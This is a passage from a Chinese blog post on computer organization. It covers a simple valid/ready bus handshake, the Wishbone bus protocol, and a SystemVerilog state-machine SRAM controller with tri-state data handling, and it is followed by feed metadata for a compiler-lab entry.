</p><ol><li>读/写操作完成.</li><li>读取的数据 <code>r_data</code>.</li></ol><h3 id="如何设计一个总线协议"><a href="#如何设计一个总线协议" class="headerlink" title="如何设计一个总线协议"></a>如何设计一个总线协议</h3><p>当 CPU 不访问内存的时候, 可以让内存休息, 减少能耗. 因此需要设计一个控制信号 <code>valid</code>, 高表示 CPU 请求一次读写操作, 低表示不请求. </p><p>内存的访问相对 CPU 来说是很慢的, 需要一个机制, 让 CPU 等待内存的访问过程. 当 CPU 要进行读写操作时, 会设置 <code>valid=1</code>, 此时内存进行实际的内存操作, 一段时间后通知 CPU 操作完成, 同时返回结果. 于是添加一个信号 <code>ready</code>, 高表示内存完成一次读写操作, 低表示还没完成或者 CPU 没有请求. 当内存完成读写时, 设置 <code>ready=1</code>, 标志着一次读写操作的完成. </p><p>CPU 进行一次读写操作需要经历的过程: </p><ol><li>CPU 设置 <code>valid=1</code>, 内存开始读写操作.</li><li>内存完成操作以后, 设置 <code>ready=1</code>, 表示操作已经完成.</li><li>CPU 看到内存设置 <code>ready=1</code> 时, 知道操作已完成, 设置 <code>valid=0</code>.</li><li>CPU 下一次进行读写操作, 再从第一步开始.</li></ol><p>这种操作方式也可以用于 CPU 访问外设, 下面用 <strong>master</strong> 表示 <strong>CPU 端</strong>, 也就是发起请求的一端; 用 <strong>slave</strong> 表示<strong>设备端</strong>, 包括内存、外设等, 也就是处理请求的一端. 回到硬件, 综合以上的分析, 可以得到 <strong>master 端的信号</strong>, 约定 <code>_o</code> 表示输出, <code>_i</code> 表示输入:</p><ol><li><code>clock_i</code>: 时钟输入.</li><li><code>valid_o</code>: 高表示 master 想要发送请求.</li><li><code>ready_i</code>: 高表示 slave 完成处理请求.</li><li><code>addr_o</code>: master 想要读写的地址.</li><li><code>we_o</code>: master 想要读还是写.</li><li><code>data_o</code>: master 想要写入的数据.</li><li><code>be_o</code>: master 读写的字节使能, 用于实现单字节写等.</li><li><code>data_i</code>: slave 提供给 master 的读取的数据.</li></ol><p>根据设计的自研总线, 可以绘制出下面的波形图 (以 master 的信号为例): </p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624679.png" alt=""></p><ul><li><code>a</code> 周期: 此时 <code>valid_o=1 &amp;&amp; ready_i=1</code> 说明有请求发生, 此时 <code>we_o=1</code> 说明是一个写操作, 写入地址是 <code>addr_o=0x01</code>, 写入数据是 <code>data_o=0x12</code>.</li><li><code>b</code> 周期: 此时 <code>valid_o=0 &amp;&amp; ready_i=0</code> 说明无事发生.</li><li><code>c</code> 周期: 此时 <code>valid_o=1 &amp;&amp; ready_i=0</code> 说明 master 想从 <code>addr_o=0x02</code> 读取数据, 但是 slave 没有完成 <code>ready_i=0</code>.</li><li><code>d</code> 周期: 此时 <code>valid_o=1 &amp;&amp; ready_i=1</code> 说明有请求发生, master 从地址 <code>addr_o=0x02</code> 读取数据 <code>data_i=0x34</code>.</li><li><code>e</code> 周期: 此时 <code>valid_o=0 &amp;&amp; ready_i=0</code> 说明无事发生.</li><li><code>f</code> 周期: 此时 <code>valid_o=1 &amp;&amp; ready_i=1</code> 说明有请求发生, master 向地址 <code>addr_o=0x03</code> 写入数据 <code>data_i=0x56</code>.</li><li><code>g</code> 周期: 此时 <code>valid_o=1 &amp;&amp; ready_i=1</code> 说明有请求发生, master 从地址 <code>addr_o=0x01</code> 读取数据 <code>data_i=0x12</code>.</li><li><code>h</code> 周期: 此时 <code>valid_o=1 &amp;&amp; ready_i=1</code> 说明有请求发生, master 向地址 <code>addr_o=0x02</code> 写入数据 <code>data_i=0x9a</code>.</li></ul><p>从波形中有几点观察: </p><ol><li>master 发起请求时, 设置 <code>valid_o=1</code>; slave 可完成请求时, 设置 <code>ready_i=1</code>; 在 <code>valid_o=1 &amp;&amp; ready_i=1</code> 时请求完成, 进行下一个请求.</li><li>如果 master 发起请求, slave 不能接收请求, 即 <code>valid_o=1 &amp;&amp; ready_i=0</code>, 此时保持 <code>addr_o</code>, <code>we_o</code>, <code>data_o</code> 和 <code>be_o</code> 不变, 直到请求结束.</li><li>master 不发起请求时, 即 <code>valid_o=0</code>, 此时总线信号都视为无效数据, 不应该进行处理; 读操作只有在 <code>valid_o=1 &amp;&amp; ready_i=1</code> 时数据有效.</li><li>可以连续多个周期发生请求, 即 <code>valid_o=1 &amp;&amp; ready_i=1</code> 连续多个周期. 此时是理想情况, 可以达到总线最高的传输速度.</li></ol><h3 id="Wishbone-总线协议-1"><a href="#Wishbone-总线协议-1" class="headerlink" title="Wishbone 总线协议"></a>Wishbone 总线协议</h3><p>实践中很常用的总线协议 Wishbone 和上面自研的总线十分类似, 以 master 端为例: </p><ol><li><code>CLK_I</code>: 时钟输入, 即自研总线中的 <code>clock_i</code>.</li><li><code>STB_O</code>: 高表示 master 要发送请求, 即自研总线中的 <code>valid_o</code>.</li><li><code>ACK_I</code>: 高表示 slave 完成请求, 即自研总线中的 <code>ready_i</code>.</li><li><code>ADR_O</code>: master 想要读写的地址, 即自研总线中的 <code>addr_o</code>.</li><li><code>WE_O</code>: master 想要读还是写, 即自研总线中的 <code>we_o</code>.</li><li><code>DAT_O</code>: master 想要写入的数据, 即自研总线中的 <code>data_o</code>.</li><li><code>SEL_O</code>: master 读写的字节使能, 即自研总线中的 <code>be_o</code>.</li><li><code>DAT_I</code>: master 从 slave 读取的数据, 即自研总线中的 <code>data_i</code>.</li><li><code>CYC_O</code>: 总线的使能信号, 无对应的自研总线信号.</li></ol><p><code>CYC_O</code> 可以认为是 master 想要占用 slave 的总线接口, 在常见的使用场景下, 直接认为 <code>CYC_O=STB_O</code>: </p><ol><li>占用 slave 的总线接口, <strong>不允许其他 master 访问</strong>.</li><li>简化 interconnect 的实现.</li></ol><p>把自研总线的波形图改成 Wishbone: </p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624680.png" alt=""></p><p>建议 Wishbone 协议每次请求结束, master 拉低 <code>CYC_O</code> 和 <code>STB_O</code>, 因此不能像上面 <code>f-g-h</code> 连续三个周期发生请求. 好处: </p><ol><li>slave 实现简单, 例如状态机中拉高 <code>ACK</code> 后回到 <code>IDLE</code> 状态即可, 一些简单的 slave 也会默认 master 会在每个请求结束后拉低 <code>CYC_O</code> 和 <code>STB_O</code>.</li><li>防止一个 master 占用总线太长时间.</li><li>波形图上每个请求区分开来, 方便阅读. </li></ol><p>最后得到如下的波形:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624681.png" alt=""></p><h3 id="Wishbone-总线规范"><a href="#Wishbone-总线规范" class="headerlink" title="Wishbone 总线规范"></a>Wishbone 总线规范</h3><p>一个规范的 Wishbone Master 需要保证:</p><ol><li><strong>不能打断</strong>正在进行的请求: 上个周期 <code>CYC_O=1 &amp;&amp; STB_O=1 &amp;&amp; ACK_I=0</code>, 这个周期维持 <code>CYC_O=1 &amp;&amp; STB_O=1</code>.</li><li><strong>不能修改</strong>正在进行的请求: 上个周期 <code>CYC_O=1 &amp;&amp; STB_O=1 &amp;&amp; ACK_I=0</code>, 这个周期 <code>ADR_O, WE_O, DAT_O, SEL_O</code> 应和上个周期相同.</li><li><strong>仅在</strong> <code>CYC_O=1 &amp;&amp; STB_O=1 &amp;&amp; ACK_I=1</code> 时, Slave 提供的 <code>DAT_I</code> 信号有效, 其他取值不应影 Master 的行为.</li></ol><p>一个规范的 Wishbone Slave 需要保证: </p><ol><li><strong>仅在</strong> <code>CYC_I=1 &amp;&amp; STB_I=1</code> 时, Master 提供的 <code>ADR_I, WE_I, DAT_I, SEL_I</code> 信号有效, 其他取值不应影响 Slave 的行为.</li></ol><h2 id="Wishbone-SRAM-控制器"><a href="#Wishbone-SRAM-控制器" class="headerlink" title="Wishbone SRAM 控制器"></a>Wishbone SRAM 控制器</h2><h3 id="Wishbone-Slave"><a href="#Wishbone-Slave" class="headerlink" title="Wishbone Slave"></a>Wishbone Slave</h3><p>Wishbone 分为 Master 和 Slave 两端, 要实现 SRAM 的控制器处理请求 Slave, 回顾 Wishbone 总线协议 Slave 端的信号, 除时钟信号外, 都是输入变输出, 输出变输入:</p><ol><li><code>CLK_I</code>: 时钟输入, 即自研总线中的 <code>clock_i</code>.</li><li><code>STB_I</code>: 高表示 master 要发送请求, 即自研总线中的 <code>valid_o</code>.</li><li><code>ACK_O</code>: 高表示 slave 完成请求, 即自研总线中的 <code>ready_i</code>.</li><li><code>ADR_I</code>: master 想要读写的地址, 即自研总线中的 <code>addr_o</code>.</li><li><code>WE_I</code>: master 想要读还是写, 即自研总线中的 <code>we_o</code>.</li><li><code>DAT_I</code>: master 想要写入的数据, 即自研总线中的 <code>data_o</code>.</li><li><code>SEL_I</code>: master 读写的字节使能, 即自研总线中的 <code>be_o</code>.</li><li><code>DAT_O</code>: master 从 slave 读取的数据, 即自研总线中的 <code>data_i</code>.</li><li><code>CYC_I</code>: 总线的使能信号, 无对应的自研总线信号.</li></ol><p>Wishbone 要点: </p><ol><li>当 <code>STB_I=1, CYC_I=1</code> 时, 表示 master 正在发起请求.</li><li>当 <code>STB_I=1, CYC_I=1, ACK_O=1</code> 时, 表示 slave 完成了当前的请求.</li></ol><p>采用状态机: </p><ol><li>第一个状态 <code>IDLE</code>, 表示闲置.</li><li>当 <code>STB_I=1, CYC_I=1</code> 时, master 发起请求, 根据请求类型分别处理读和写, 需要状态 <code>READ</code> 和 <code>WRITE</code>.</li><li>读需要两个周期, 写需要三个周期, 添加状态 <code>READ_2</code>, <code>WRITE_2</code> 和 <code>WRITE_3</code>.</li><li>读写完成转移到 <code>DONE</code> 状态, 设置 <code>ACK_O=1</code>, 然后回到 <code>IDLE</code> 状态.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624683.png" alt=""></p><p>在 SystemVerilog 中定义各个状态: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">{</span>    STATE_IDLE <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    STATE_READ <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>    STATE_READ_2 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>    STATE_WRITE <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>    STATE_WRITE_2 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>    STATE_WRITE_3 <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>    STATE_DONE <span class="token operator">=</span> <span class="token number">6</span><span class="token operator">}</span> state_t<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写出状态转移表:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">state_t state<span class="token punctuation">;</span><span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>        state <span class="token operator">&lt;=</span> STATE_IDLE<span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        <span class="token keyword">case</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span>            STATE_IDLE<span class="token punctuation">:</span> <span class="token keyword">begin</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>STB_I <span class="token operator">&amp;&amp;</span> CYC_I<span class="token punctuation">)</span> <span class="token keyword">begin</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>WE_I<span class="token punctuation">)</span> <span class="token keyword">begin</span>                        state <span class="token operator">&lt;=</span> STATE_WRITE<span class="token punctuation">;</span>                    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>                        state <span class="token operator">&lt;=</span> STATE_READ<span class="token punctuation">;</span>                    <span class="token keyword">end</span>                <span class="token keyword">end</span>            <span class="token keyword">end</span>            STATE_READ<span class="token punctuation">:</span> <span class="token keyword">begin</span>                state <span class="token operator">&lt;=</span> STATE_READ_2<span class="token punctuation">;</span>            <span class="token keyword">end</span>            <span class="token comment">// ...</span>        <span class="token keyword">endcase</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SRAM-控制器-1"><a href="#SRAM-控制器-1" class="headerlink" title="SRAM 控制器"></a>SRAM 控制器</h3><p>在状态机的基础上实现 SRAM 控制器, 采用两周期读、三周期写的实现方式. </p><p>对于一次<strong>读操作</strong>, 需要经历如下的四个周期:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624684.png" alt=""></p><ol><li>(a): master 设置 <code>CYC_I=1</code>, <code>STB_I=1</code>, <code>WE_I=0</code>, 状态是 <code>IDLE</code>, 下个状态是 <code>READ</code>.</li><li>(b): 输出 <code>addr</code>, <code>oe_n=0</code>, <code>ce_n=0</code>, <code>we_n=1</code>, 根据 <code>SEL_I=0b1111</code> 可知四个字节都要读取, 输出 <code>be_n=0b0000</code>, 此时状态是 <code>READ</code>, 下一个状态是 <code>READ_2</code>.</li><li>(c): SRAM 返回了数据, 把数据保存到寄存器中, 此时状态是 <code>READ_2</code>, 下一个状态是 <code>DONE</code>.</li><li>(d): 输出 <code>ce_n=1</code>, <code>oe_n=1</code> 让 SRAM 恢复空闲状态, 设置 <code>ACK_O=1</code>, 此时请求完成, 状态是 <code>DONE</code>, 下一个状态是 <code>IDLE</code>.</li></ol><p>对于一次<strong>写操作</strong>, 需要经历如下五个周期: </p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624685.png" alt=""></p><ol><li>(a): master 设置 <code>CYC_I=1, STB_I=1, WE_I=1</code>, 此时状态是 <code>IDLE</code>, 下一个状态是 <code>WRITE</code>.</li><li>(b): 输出 <code>addr</code>, <code>data</code>, <code>oe_n=1</code>, <code>ce_n=0</code>, <code>we_n=1</code>, 根据 <code>SEL_I=0b1111</code> 可知四个字节都要写入, 输出 <code>be_n=0b0000</code>, 此时状态是 <code>WRITE</code>, 下一个状态是 <code>WRITE_2</code>.</li><li>(c): 输出 <code>we_n=0</code>, 此时状态是 <code>WRITE_2</code>, 下一个状态是 <code>WRITE_3</code>.</li><li>(d): 输出 <code>we_n=1</code>, 此时状态是 <code>WRITE_3</code>, 下一个状态是 <code>DONE</code>.</li><li>(e): 输出 <code>ce_n=1</code> 让 SRAM 恢复空闲状态, 设置 <code>ACK_O=1</code>, 此时请求完成, 状态是 <code>DONE</code>, 下一个状态是 <code>IDLE</code>.</li></ol><p>需要注意, Wishbone 的地址的单位是字节, 而 SRAM 的地址的单位是 4 字节, 地址有一个四倍的关系.</p><h3 id="状态机实现技巧"><a href="#状态机实现技巧" class="headerlink" title="状态机实现技巧"></a>状态机实现技巧</h3><p>以写操作为例子, 在上图 <code>b</code> 周期的时候, 状态从 <code>IDLE</code> 变成 <code>WRITE</code>, 并且 <code>ram_ce_n</code> 从 1 变为 0. 在时序逻辑 <code>always_ff @ (posedge clock)</code> 中更新 <code>state</code>: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token comment">// ...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>STB_I <span class="token operator">&amp;&amp;</span> CYC_I<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>WE_I<span class="token punctuation">)</span> <span class="token keyword">begin</span>            state <span class="token operator">&lt;=</span> STATE_WRITE<span class="token punctuation">;</span>        <span class="token keyword">end</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如何修改 <code>ram_ce_n</code>? 一种思路是设定一个寄存器 <code>ram_ce_n_reg</code>, 把寄存器输出直接连接到 <code>ram_ce_n</code> 上. 此时需要保证进入 <code>WRITE</code> 状态时修改 <code>ram_ce_n_reg</code>, 保证 <code>ram_ce_n</code> 和 <code>state</code> 同时更新:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">reg</span> ram_ce_n_reg<span class="token punctuation">;</span><span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>        state <span class="token operator">&lt;=</span> STATE_IDLE<span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        <span class="token comment">// ...</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>STB_I <span class="token operator">&amp;&amp;</span> CYC_I <span class="token operator">&amp;&amp;</span> state <span class="token operator">==</span> STATE_IDLE<span class="token punctuation">)</span> <span class="token keyword">begin</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>WE_I<span class="token punctuation">)</span> <span class="token keyword">begin</span>                ram_ce_n_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>                state <span class="token operator">&lt;=</span> STATE_WRITE<span class="token punctuation">;</span>            <span class="token keyword">end</span>        <span class="token keyword">end</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span class="token important">always_comb</span> <span class="token keyword">begin</span>  ram_ce_n <span class="token operator">=</span> ram_ce_n_reg<span class="token punctuation">;</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>好处是从寄存器到输出的<strong>延迟很小</strong>, 适合用于<strong>访问外设</strong>的场景; 缺点是实现需要<strong>根据上一个周期的状态进行判断和更新</strong>, 如果状态比较复杂, 在每个转移的地方都需要相应地设置 <code>ram_ce_n_reg</code>.</p><p>另一种方式是用组合逻辑计算出当前的 <code>ram_ce_n</code>: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span> <span class="token keyword">begin</span>    <span class="token comment">// default</span>    ram_ce_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> STATE_WRITE<span class="token punctuation">)</span> <span class="token keyword">begin</span>        ram_ce_n <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样的好处是<strong>减少了寄存器的使用</strong>, 并且代码上比较简单; 缺点是把<strong>组合逻辑的延迟</strong>引入了输出的路径上, 可能会使得 SRAM 接口上的<strong>时序变得更长</strong>. </p><h3 id="SRAM-控制信号初始化"><a href="#SRAM-控制信号初始化" class="headerlink" title="SRAM 控制信号初始化"></a>SRAM 控制信号初始化</h3><p>实现 SRAM 控制器时, 在 FPGA 刚烧入 Bitstream 的时候, 状态机还没有初始化, 此时的 SRAM 控制信号 <code>ce_n</code>, <code>we_n</code> 和 <code>oe_n</code> 等可能处于 0, SRAM 就会认为此时的 FPGA 在进行写操作, 导致 SRAM 内的数据被覆盖. </p><p>解决方法是, 在 <code>initial</code> 和 <code>reset</code> 中对 SRAM 控制信号进行设置:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">initial</span> <span class="token keyword">begin</span>    ram_ce_n_reg <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    ram_oe_n_reg <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    ram_we_n_reg <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token keyword">assign</span> ram_ce_n <span class="token operator">=</span> ram_ce_n_reg<span class="token punctuation">;</span><span class="token keyword">assign</span> ram_oe_n <span class="token operator">=</span> ram_oe_n_reg<span class="token punctuation">;</span><span class="token keyword">assign</span> ram_we_n <span class="token operator">=</span> ram_we_n_reg<span class="token punctuation">;</span><span class="token important">always @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>        ram_ce_n_reg <span class="token operator">&lt;=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        ram_oe_n_reg <span class="token operator">&lt;=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        ram_we_n_reg <span class="token operator">&lt;=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三态门"><a href="#三态门" class="headerlink" title="三态门"></a>三态门</h2><p>实现 SRAM 控制器会遇到这样的一个问题: 读写需要经过同样信号 <code>sram_data</code> 传输数据. 在一些接口协议中, 为节省引脚数量, 都出现了同一信号在不同时间传输不同方向数据的现象. 为防止两端设备同时输出, 设备在不输出信号时需要设置高阻态. 在 SystemVerilog 代码中, 通常将三态门 <code>signal_io</code> 拆分成三个信号: <code>signal_i</code>, <code>signal_o</code> 和 <code>signal_t</code>, 分别表示输入、输出和高阻态. 对应的代码如下: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> tri_state_logic <span class="token punctuation">(</span>    <span class="token keyword">inout</span> signal_io<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">wire</span> signal_i<span class="token punctuation">;</span>    <span class="token keyword">wire</span> signal_o<span class="token punctuation">;</span>    <span class="token keyword">wire</span> signal_t<span class="token punctuation">;</span>    <span class="token keyword">assign</span> signal_io <span class="token operator">=</span> signal_t <span class="token operator">?</span> <span class="token number">1'bz</span> <span class="token punctuation">:</span> signal_o<span class="token punctuation">;</span>    <span class="token keyword">assign</span> signal_i <span class="token operator">=</span> signal_io<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内部可以方便地处理三态逻辑. 以 SRAM 为例, <code>sram_data</code> 需要按如下方式处理: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> sram_controller <span class="token punctuation">(</span>    <span class="token keyword">inout</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sram_data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sram_data_i_comb<span class="token punctuation">;</span>    <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sram_data_o_comb<span class="token punctuation">;</span>    <span class="token keyword">reg</span> sram_data_t_comb<span class="token punctuation">;</span>    <span class="token keyword">assign</span> sram_data <span class="token operator">=</span> sram_data_t_comb <span class="token operator">?</span> <span class="token number">32'bz</span> <span class="token punctuation">:</span> sram_data_o_comb<span class="token punctuation">;</span>    <span class="token keyword">assign</span> sram_data_i_comb <span class="token operator">=</span> sram_data<span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        sram_data_t_comb <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>        sram_data_o_comb <span class="token operator">=</span> <span class="token number">32'b0</span><span class="token punctuation">;</span>        <span class="token comment">// ...</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>sram_data_t_comb=1</code> 时, 进入高阻态, 对应读操作, 读取的数据在 <code>sram_data_i_comb</code> 信号; 当 <code>sram_data_t_comb=0</code> 时, 进入输出状态, 对应写操作. 对 SRAM 控制器来说, 只需要在相应状态下设置 <code>sram_data_t_comb</code> 即可. </p><p>上面 <code>sram_data_o_comb</code> 和 <code>sram_data_t_comb</code> 也可改用寄存器结合状态机实现: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> sram_controller <span class="token punctuation">(</span>    <span class="token keyword">inout</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sram_data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sram_data_i_comb<span class="token punctuation">;</span>    <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sram_data_o_reg<span class="token punctuation">;</span>    <span class="token keyword">reg</span> sram_data_t_reg<span class="token punctuation">;</span>    <span class="token keyword">assign</span> sram_data <span class="token operator">=</span> sram_data_t_reg <span class="token operator">?</span> <span class="token number">32'bz</span> <span class="token punctuation">:</span> sram_data_o_reg<span class="token punctuation">;</span>    <span class="token keyword">assign</span> sram_data_i_comb <span class="token operator">=</span> sram_data<span class="token punctuation">;</span>    <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>            <span class="token comment">// high-Z when reset</span>            sram_data_t_reg <span class="token operator">&lt;=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            sram_data_o_reg <span class="token operator">&lt;=</span> <span class="token number">32'b0</span><span class="token punctuation">;</span>            <span class="token comment">// ...</span>        <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>            <span class="token comment">// ...</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>STB_I <span class="token operator">&amp;&amp;</span> CYC_I <span class="token operator">&amp;&amp;</span> state <span class="token operator">==</span> STATE_IDLE<span class="token punctuation">)</span> <span class="token keyword">begin</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>WE_I<span class="token punctuation">)</span> <span class="token keyword">begin</span>                    <span class="token comment">// write</span>                    sram_data_t_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>                    sram_data_o_reg <span class="token operator">&lt;=</span> DAT_I<span class="token punctuation">;</span>                    state <span class="token operator">&lt;=</span> STATE_WRITE<span class="token punctuation">;</span>                <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>                    <span class="token comment">// read</span>                    sram_data_t_reg <span class="token operator">&lt;=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>                    state <span class="token operator">&lt;=</span> STATE_READ<span class="token punctuation">;</span>                <span class="token keyword">end</span>            <span class="token keyword">end</span>        <span class="token keyword">end</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理 实验1</title>
      <link href="/2023/10/17/bian-yi-yuan-li-lab-1/"/>
      <url>/2023/10/17/bian-yi-yuan-li-lab-1/</url>
      
